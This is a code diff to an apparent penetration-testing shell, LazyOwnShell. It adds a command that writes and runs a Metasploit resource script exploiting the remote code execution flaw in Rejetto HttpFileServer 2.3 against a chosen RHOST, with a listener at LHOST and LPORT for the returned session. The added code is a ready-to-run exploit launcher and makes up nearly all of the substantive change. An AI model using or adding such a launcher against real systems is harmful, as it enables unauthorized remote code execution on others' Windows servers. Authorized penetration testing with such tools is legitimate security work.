@@ -12342,7 +12342,7 @@ class LazyOwnShell(Cmd):
             mode = input("    [!] Choose mode (server 1 or client 2): ").strip().lower()
         else:
             mode = line
-        
+        # Line: 12345 xD
         if mode == '1':
             lport = self.params["lport"]
             password = input("    [!] Enter the Shadowsocks password: ").strip()
@@ -12813,6 +12813,39 @@ class LazyOwnShell(Cmd):
             except ValueError:
                 print_error("Por favor, ingresa un número válido.")
 
+        return
+    def do_rejetto_hfs_exec(self, line):
+        """
+        HttpFileServer version 2.3. Vulnerable using the module rejetto_hfs_exec of metasploit
+        :param line: Command line input that provides the LHOST and RHOST.
+        :type line: str
+        :returns: None
+        """
+
+        rhost = self.params["rhost"]
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+
+        if not rhost or not lhost:
+            print_warn("RHOST and LHOST must be specified.")
+            return
+
+        rc_file_path = "/tmp/rejetto_hfs_exec.rc"
+        with open(rc_file_path, "w") as file:
+            file.write(f"""
+            use exploit/windows/http/rejetto_hfs_exec
+            set RHOSTS {rhost}
+            set LHOST {lhost}
+            set LPORT {lport}
+            run
+            """)
+
+        subprocess.run(["msfconsole", "-r", rc_file_path], check=True)
+
+        if os.path.exists(rc_file_path):
+            os.remove(rc_file_path)
+
+        print_msg(f"Executed rejetto_hfs_exec exploitation on {rhost} with listener {lhost}.")
         return
 
 if __name__ == "__main__":
